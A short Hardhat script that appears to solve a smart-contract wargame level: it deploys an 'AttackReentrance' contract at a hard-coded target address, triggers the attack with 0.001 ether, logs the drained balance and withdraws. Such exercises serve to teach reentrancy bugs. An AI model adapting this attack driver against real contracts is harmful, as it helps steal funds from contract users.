const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const [owner] = await ethers.getSigners();
  // const ReentranceContract = await hre.ethers.getContractFactory("Reentrance");
  // // attach your instance address
  const Instance = "0x3642039847AE0ADA295C24Bc2BC07b2Eb62f6AdB";
  // const Reentrance = ReentranceContract.attach(Instance);
  const AttackReentranceContract = await ethers.getContractFactory(
    "AttackReentrance"
  );
  const AttackReentrance = await AttackReentranceContract.deploy(Instance);
  await AttackReentrance.deployed();
  console.log(AttackReentrance.address, "addr");
  const ReentranceOldBalance = await ethers.provider.getBalance(Instance);
  console.log(
    "ReentranceOldBalance -->",
    ethers.utils.formatEther(ReentranceOldBalance)
  );
  console.log("Attacking...");
  await AttackReentrance.Attack({ value: ethers.utils.parseEther("0.001") });
  console.log("Attacked..");
  const ReentranceUpdatedBalance = await ethers.provider.getBalance(Instance);

  console.log(
    "ReentranceUpdatedBalance -->",
    ethers.utils.formatEther(ReentranceUpdatedBalance)
  );
  await AttackReentrance.withdraw();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
